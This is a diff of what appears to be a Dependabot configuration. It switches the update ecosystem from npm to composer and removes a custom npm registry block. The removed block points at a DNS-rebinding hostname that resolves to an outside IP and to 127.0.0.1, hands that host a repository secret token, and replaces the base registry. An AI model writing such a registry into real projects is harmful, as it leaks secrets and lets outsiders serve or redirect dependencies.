@@ -1,12 +1,5 @@
 version: 2
-registries:
-  sink1tunnel:
-    type: npm-registry
-    url: http://k44-make-206-189-156-69-and-127-0-0-1-rr.1u.ms/
-    token: ${{secrets.SINK1_TOKEN}}
-    replaces-base: true
 updates:
-  - package-ecosystem: "npm"
+  - package-ecosystem: "composer"
     directory: "/"
     schedule: {interval: "daily"}
-    registries: "*"
